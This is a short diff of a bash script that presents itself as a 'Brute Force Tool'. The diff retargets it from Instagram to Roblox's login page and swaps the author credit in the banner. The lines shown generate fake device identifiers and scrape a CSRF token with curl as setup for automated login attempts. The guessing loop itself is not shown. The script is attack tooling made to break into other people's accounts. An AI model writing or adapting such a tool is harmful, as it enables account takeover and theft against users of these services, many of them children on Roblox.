@@ -11,7 +11,7 @@ device="android-$string16"
 uuid=$(openssl rand -hex 32 | cut -c 1-32)
 phone="$string8-$string4-$string4-$string4-$string12"
 guid="$string8-$string4-$string4-$string4-$string12"
-var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
+var=$(curl -i -s -H "$header" https://www.roblox.com/login > /dev/null)
 var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
 
 checkroot() {
@@ -50,7 +50,7 @@ printf "\e[1;80m ) )| ||  _ \  /___)(_   _)(____ |  \e[0m\n"
 printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ |  \e[0m\n"
 printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|  \e[0m\n"
 printf "\n"
-printf "\e[1;50m\e[40m  Instagram Brute Force Tool by @dhasirar(IG)   \e[0m\n"
+printf "\e[1;50m\e[40m  Roblox Brute Force Tool by @bitexxl34\e[0m\n"
 printf "\n"
 }
 
